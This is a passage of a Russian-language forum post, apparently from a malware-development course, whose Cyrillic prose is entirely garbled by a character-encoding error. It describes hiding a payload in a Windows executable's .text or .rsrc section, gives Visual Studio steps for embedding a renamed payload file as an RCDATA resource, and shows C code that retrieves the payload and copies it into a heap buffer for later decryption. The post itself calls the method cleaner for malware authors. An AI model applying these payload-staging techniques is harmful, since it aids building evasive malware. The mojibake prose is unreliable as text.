–û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç—å —Ä–∞–∑–¥–µ–ª–∞ .text –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –æ–Ω —Ö—Ä–∞–Ω–∏—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ —Å –ø—Ä–∞–≤–∞–º–∏ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –≤ –ø–∞–º—è—Ç–∏</u></b>, –ø–æ–∑–≤–æ–ª—è—è –∏—Ö –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞–ø—Ä—è–º—É—é –±–µ–∑ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ä–µ–≥–∏–æ–Ω—É –ø–∞–º—è—Ç–∏. –≠—Ç–æ –ø–æ–ª–µ–∑–Ω–æ –¥–ª—è –Ω–µ–±–æ–ª—å—à–∏—Ö –ø–æ–ª–µ–∑–Ω—ã—Ö –Ω–∞–≥—Ä—É–∑–æ–∫, —Ä–∞–∑–º–µ—Ä –∫–æ—Ç–æ—Ä—ã—Ö –ø—Ä–∏–º–µ—Ä–Ω–æ –º–µ–Ω—å—à–µ 10 –±–∞–π—Ç.<br />
<br />
–ü—Ä–∏ –∏–∑—É—á–µ–Ω–∏–∏ –¥–≤–æ–∏—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞, —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∏–∑ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–≥–æ –≤—ã—à–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞ –∫–æ–¥–∞ —Å –ø–æ–º–æ—â—å—é –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ PE-Bear, –≤–∏–¥–Ω–æ, —á—Ç–æ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–µ–≥–∏–æ–Ω–µ .text.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732357009.png"
		data-src="https://osint42.org/attachments/1746732357009-png.61/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732357009-png.61/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732357009.png"
			title="1746732357009.png"
			width="975" height="561" loading="lazy" />
	</div><br />
<br />
<b>–†–∞–∑–¥–µ–ª .rsrc</b><br />
<br />
–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ —Ä–∞–∑–¥–µ–ª–µ .rsrc —è–≤–ª—è–µ—Ç—Å—è –æ–¥–Ω–∏–º –∏–∑ –ª—É—á—à–∏—Ö –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤, —Ç–∞–∫ –∫–∞–∫ –∏–º–µ–Ω–Ω–æ –∑–¥–µ—Å—å –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ —Ä–µ–∞–ª—å–Ω—ã—Ö –¥–≤–æ–∏—á–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ. –≠—Ç–æ —Ç–∞–∫–∂–µ –±–æ–ª–µ–µ —á–∏—Å—Ç—ã–π –º–µ—Ç–æ–¥ –¥–ª—è –∞–≤—Ç–æ—Ä–æ–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º, –ø–æ—Å–∫–æ–ª—å–∫—É –±–æ–ª—å—à–∏–µ –ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏ –Ω–µ –º–æ–≥—É—Ç –±—ã—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ —Ä–∞–∑–¥–µ–ª–∞—Ö .data –∏–ª–∏ .rdata –∏–∑-–∑–∞ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π –ø–æ —Ä–∞–∑–º–µ—Ä—É, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –æ—à–∏–±–∫–∞–º –æ—Ç Visual Studio –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏.<br />
<br />
–ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω—ã —à–∞–≥–∏ –ø–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—é –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ —Ä–∞–∑–¥–µ–ª–µ .rsrc.<br />
<br />
1.–í–Ω—É—Ç—Ä–∏ Visual Studio —â–µ–ª–∫–Ω–∏—Ç–µ –ø—Ä–∞–≤–æ–π –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏ –Ω–∞ &#039;Resource files&#039; (–†–µ—Å—É—Ä—Å–Ω—ã–µ —Ñ–∞–π–ª—ã), –∑–∞—Ç–µ–º –≤—ã–±–µ—Ä–∏—Ç–µ Add (–î–æ–±–∞–≤–∏—Ç—å) &gt; New Item (–ù–æ–≤—ã–π —ç–ª–µ–º–µ–Ω—Ç).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732364447.png"
		data-src="https://osint42.org/attachments/1746732364447-png.62/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732364447-png.62/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732364447.png"
			title="1746732364447.png"
			width="973" height="628" loading="lazy" />
	</div><br />
<br />
<br />
2.–ö–ª–∏–∫–Ω–∏—Ç–µ –Ω–∞ &#039;Resource File&#039;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732378875.png"
		data-src="https://osint42.org/attachments/1746732378875-png.63/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732378875-png.63/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732378875.png"
			title="1746732378875.png"
			width="973" height="677" loading="lazy" />
	</div><br />
<br />
3. –≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –≤—ã–∑–æ–≤–µ—Ç –Ω–æ–≤—É—é –±–æ–∫–æ–≤—É—é –ø–∞–Ω–µ–ª—å, &quot;–ü—Ä–æ—Å–º–æ—Ç—Ä —Ä–µ—Å—É—Ä—Å–æ–≤&quot; (Resource View). –©–µ–ª–∫–Ω–∏—Ç–µ –ø—Ä–∞–≤–æ–π –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏ –Ω–∞ —Ñ–∞–π–ª–µ .rc (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –∏–º—è —Ñ–∞–π–ª–∞ - Resource.rc) –∏ –≤—ã–±–µ—Ä–∏—Ç–µ –æ–ø—Ü–∏—é &quot;–î–æ–±–∞–≤–∏—Ç—å —Ä–µ—Å—É—Ä—Å&quot; (&#039;Add Resource&#039;).<br />
–ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ —Å–ª–µ–¥–æ–≤–∞—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è–º, —á—Ç–æ–±—ã –∑–∞–≤–µ—Ä—à–∏—Ç—å –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤–∞—à–µ–≥–æ —Ä–µ—Å—É—Ä—Å–∞ –≤ —Ä–∞–∑–¥–µ–ª .rsrc. –û–±—ã—á–Ω–æ –ø–æ—Å–ª–µ —ç—Ç–æ–≥–æ —à–∞–≥–∞ –≤–∞–º –ø—Ä–µ–¥–ª–æ–∂–∞—Ç –≤—ã–±—Ä–∞—Ç—å —Ç–∏–ø —Ä–µ—Å—É—Ä—Å–∞, –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Ö–æ—Ç–∏—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∏–∫–æ–Ω–∫–∞, –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ, —Å—Ç—Ä–æ–∫–∞ –∏ —Ç. –¥.), –∞ –∑–∞—Ç–µ–º –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –¥–∞–Ω–Ω—ã–µ –∏–ª–∏ —Ñ–∞–π–ª—ã –¥–ª—è —ç—Ç–æ–≥–æ —Ä–µ—Å—É—Ä—Å–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732400776.png"
		data-src="https://osint42.org/attachments/1746732400776-png.64/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732400776-png.64/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732400776.png"
			title="1746732400776.png"
			width="711" height="702" loading="lazy" />
	</div><br />
<br />
4. –ö–ª–∏–∫–Ω–∏—Ç–µ –Ω–∞ &#039;Import&#039;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732413812.png"
		data-src="https://osint42.org/attachments/1746732413812-png.65/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732413812-png.65/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732413812.png"
			title="1746732413812.png"
			width="970" height="720" loading="lazy" />
	</div><br />
<br />
5. –í—ã–±–µ—Ä–∏—Ç–µ —Ñ–∞–π–ª calc.ico, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –∏—Å—Ö–æ–¥–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π, –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–Ω–æ–π —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º .ico.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732427731.png"
		data-src="https://osint42.org/attachments/1746732427731-png.66/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732427731-png.66/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732427731.png"
			title="1746732427731.png"
			width="973" height="555" loading="lazy" />
	</div><br />
<br />
6. –ü–æ—è–≤–∏—Ç—Å—è –∑–∞–ø—Ä–æ—Å –Ω–∞ —É–∫–∞–∑–∞–Ω–∏–µ —Ç–∏–ø–∞ —Ä–µ—Å—É—Ä—Å–∞. –í–≤–µ–¥–∏—Ç–µ &quot;RCDATA&quot; –±–µ–∑ –∫–∞–≤—ã—á–µ–∫.<br />
–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: &quot;RCDATA&quot; - —ç—Ç–æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π —Ç–∏–ø —Ä–µ—Å—É—Ä—Å–∞ –≤ Windows –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ –¥–≤–æ–∏—á–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732438564.png"
		data-src="https://osint42.org/attachments/1746732438564-png.67/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732438564-png.67/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732438564.png"
			title="1746732438564.png"
			width="973" height="839" loading="lazy" />
	</div><br />
<br />
7. –ü–æ—Å–ª–µ –Ω–∞–∂–∞—Ç–∏—è –∫–Ω–æ–ø–∫–∏ –û–ö –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –¥–æ–ª–∂–Ω–∞ –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å—Å—è –≤ –∏—Å—Ö–æ–¥–Ω–æ–º –¥–≤–æ–∏—á–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ –≤–Ω—É—Ç—Ä–∏ –ø—Ä–æ–µ–∫—Ç–∞ Visual Studio.<br />
–£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã –ø—Ä–æ–≤–µ—Ä–∏–ª–∏ —Ä–µ—Å—É—Ä—Å–Ω—ã–π —Ñ–∞–π–ª –∏ —É–¥–æ—Å—Ç–æ–≤–µ—Ä–∏–ª–∏—Å—å, —á—Ç–æ –æ–Ω —Å–æ–¥–µ—Ä–∂–∏—Ç –æ–∂–∏–¥–∞–µ–º—ã–µ –¥–∞–Ω–Ω—ã–µ. –ï—Å–ª–∏ –≤—Å–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–æ –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –≤—ã —Å–º–æ–∂–µ—Ç–µ —É–≤–∏–¥–µ—Ç—å —Å–≤–æ—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –≤–Ω—É—Ç—Ä–∏ —Ñ–∞–π–ª–∞ —Ä–µ—Å—É—Ä—Å–æ–≤ –∏, –ø—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏, –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –µ–µ –≤ –¥–∞–ª—å–Ω–µ–π—à–∏—Ö —ç—Ç–∞–ø–∞—Ö —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732459557.png"
		data-src="https://osint42.org/attachments/1746732459557-png.68/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732459557-png.68/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732459557.png"
			title="1746732459557.png"
			width="973" height="566" loading="lazy" />
	</div><br />
<br />
8. –ü—Ä–∏ –≤—ã—Ö–æ–¥–µ –∏–∑ &quot;–ü—Ä–æ—Å–º–æ—Ç—Ä–∞ —Ä–µ—Å—É—Ä—Å–æ–≤&quot; (Resource View) –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤–∏–¥–µ–Ω –∑–∞–≥–æ–ª–æ–≤–æ—á–Ω—ã–π —Ñ–∞–π–ª &quot;resource.h&quot;, –∫–æ—Ç–æ—Ä—ã–π –Ω–∞–∑–≤–∞–Ω –≤ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–∏ —Å —Ñ–∞–π–ª–æ–º .rc –∏–∑ —à–∞–≥–∞ 2. –≠—Ç–æ—Ç —Ñ–∞–π–ª —Å–æ–¥–µ—Ä–∂–∏—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä define, –∫–æ—Ç–æ—Ä—ã–π —Å—Å—ã–ª–∞–µ—Ç—Å—è –Ω–∞ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ —Ä–∞–∑–¥–µ–ª–µ —Ä–µ—Å—É—Ä—Å–æ–≤ (IDR_RCDATA1). –≠—Ç–æ –≤–∞–∂–Ω–æ, —á—Ç–æ–±—ã –≤ –¥–∞–ª—å–Ω–µ–π—à–µ–º –∏–º–µ—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∏–∑–≤–ª–µ—á—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –∏–∑ —Ä–∞–∑–¥–µ–ª–∞ —Ä–µ—Å—É—Ä—Å–æ–≤.<br />
–£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —É –≤–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –∫ —ç—Ç–æ–º—É –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—É, –∫–æ–≥–¥–∞ –≤—ã –±—É–¥–µ—Ç–µ –∏–∑–≤–ª–µ–∫–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –∏–∑ –≤–∞—à–µ–≥–æ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732470179.png"
		data-src="https://osint42.org/attachments/1746732470179-png.69/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732470179-png.69/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732470179.png"
			title="1746732470179.png"
			width="975" height="658" loading="lazy" />
	</div><br />
<br />
–ü–æ—Å–ª–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Ç–µ–ø–µ—Ä—å –±—É–¥–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –≤ —Ä–∞–∑–¥–µ–ª–µ .rsrc, –Ω–æ –∫ –Ω–µ–π –Ω–µ–ª—å–∑—è –±—É–¥–µ—Ç –æ–±—Ä–∞—Ç–∏—Ç—å—Å—è –Ω–∞–ø—Ä—è–º—É—é. –í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ WinAPI –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –Ω–µ–π.<br />
<br />
FindResourceW - –ø–æ–ª—É—á–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ —É–∫–∞–∑–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö, —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –≤ —Ä–∞–∑–¥–µ–ª–µ —Ä–µ—Å—É—Ä—Å–æ–≤ —Å –æ—Å–æ–±—ã–º –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–º ID (–æ–Ω –æ–ø—Ä–µ–¥–µ–ª–µ–Ω –≤ –∑–∞–≥–æ–ª–æ–≤–æ—á–Ω–æ–º —Ñ–∞–π–ª–µ).<br />
LoadResource - –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä HGLOBAL –¥–∞–Ω–Ω—ã—Ö —Ä–µ—Å—É—Ä—Å–∞. –≠—Ç–æ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Ä–µ—Å—É—Ä—Å–∞ –≤ –ø–∞–º—è—Ç–∏.<br />
LockResource - –ø–æ–ª—É—á–∞–µ—Ç —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ä–∞–∑–¥–µ–ª–µ —Ä–µ—Å—É—Ä—Å–æ–≤ –ø–æ –µ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—É.<br />
SizeofResource - –ø–æ–ª—É—á–∞–µ—Ç —Ä–∞–∑–º–µ—Ä —É–∫–∞–∑–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ —Ä–∞–∑–¥–µ–ª–µ —Ä–µ—Å—É—Ä—Å–æ–≤. –ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≤—ã—à–µ—É–ø–æ–º—è–Ω—É—Ç—ã–µ Windows API –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ —Ä–∞–∑–¥–µ–ª—É .rsrc –∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ –∏ —Ä–∞–∑–º–µ—Ä–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &quot;resource.h&quot;int main() {

    HRSRC        hRsrc                   = NULL;
    HGLOBAL        hGlobal                 = NULL;
    PVOID        pPayloadAddress         = NULL;
    SIZE_T        sPayloadSize            = NULL;


    // Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
    hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    if (hRsrc == NULL) {
        // in case of function failure
        printf(&quot;[!] FindResourceW Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    // Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
    hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) {
        // in case of function failure
        printf(&quot;[!] LoadResource Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    // Get the address of our payload in .rsrc section
    pPayloadAddress = LockResource(hGlobal);
    if (pPayloadAddress == NULL) {
        // in case of function failure
        printf(&quot;[!] LockResource Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    // Get the size of our payload in .rsrc section
    sPayloadSize = SizeofResource(NULL, hRsrc);
    if (sPayloadSize == NULL) {
        // in case of function failure
        printf(&quot;[!] SizeofResource Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    // Printing pointer and size to the screen
    printf(&quot;[i] pPayloadAddress var : 0x%p \n&quot;, pPayloadAddress);
    printf(&quot;[i] sPayloadSize var : %ld \n&quot;, sPayloadSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ...&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
–ü–æ—Å–ª–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –∏ –∑–∞–ø—É—Å–∫–∞ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–≥–æ –≤—ã—à–µ –∫–æ–¥–∞ –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤–º–µ—Å—Ç–µ —Å –µ–µ —Ä–∞–∑–º–µ—Ä–æ–º –±—É–¥–µ—Ç –≤—ã–≤–µ–¥–µ–Ω –Ω–∞ —ç–∫—Ä–∞–Ω. –í–∞–∂–Ω–æ –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —ç—Ç–æ—Ç –∞–¥—Ä–µ—Å –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–∞–∑–¥–µ–ª–µ .rsrc, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –ø–∞–º—è—Ç—å —Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è, –∏ –ª—é–±—ã–µ –ø–æ–ø—ã—Ç–∫–∏ –∏–∑–º–µ–Ω–∏—Ç—å –∏–ª–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –≤–Ω—É—Ç—Ä–∏ –Ω–µ–≥–æ –ø—Ä–∏–≤–µ–¥—É—Ç –∫ –æ—à–∏–±–∫–µ –Ω–∞—Ä—É—à–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞. –î–ª—è —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–¥–µ–ª–∏—Ç—å –±—É—Ñ–µ—Ä —Ç–∞–∫–æ–≥–æ –∂–µ —Ä–∞–∑–º–µ—Ä–∞, –∫–∞–∫ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, –∏ —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –µ–≥–æ. –í —ç—Ç–æ–º –Ω–æ–≤–æ–º –±—É—Ñ–µ—Ä–µ –º–æ–∂–Ω–æ –≤–Ω–æ—Å–∏—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏—è, —Ç–∞–∫–∏–µ –∫–∞–∫ –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ .rsrc</b><br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –Ω–µ–ª—å–∑—è –Ω–∞–ø—Ä—è–º—É—é —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å –∏–∑ —Ä–∞–∑–¥–µ–ª–∞ —Ä–µ—Å—É—Ä—Å–æ–≤, –µ–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä.<br />
–î–ª—è —ç—Ç–æ–≥–æ –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª—è–µ—Ç—Å—è —Ä–∞–∑–º–µ—Ä–æ–º –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º HeapAlloc, –∞ –∑–∞—Ç–µ–º –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –ø–µ—Ä–µ–º–µ—â–∞–µ—Ç—Å—è –∏–∑ —Ä–∞–∑–¥–µ–ª–∞ —Ä–µ—Å—É—Ä—Å–æ–≤ –≤ –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º memcpy.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Allocating memory using a HeapAlloc call
PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
if (pTmpBuffer != NULL){
    // copying the payload from resource section to the new buffer
    memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
}

// Printing the base address of our buffer (pTmpBuffer)
printf(&quot;[i] pTmpBuffer var : 0x%p \n&quot;, pTmpBuffer);</code></pre>
	</div>
</div><br />
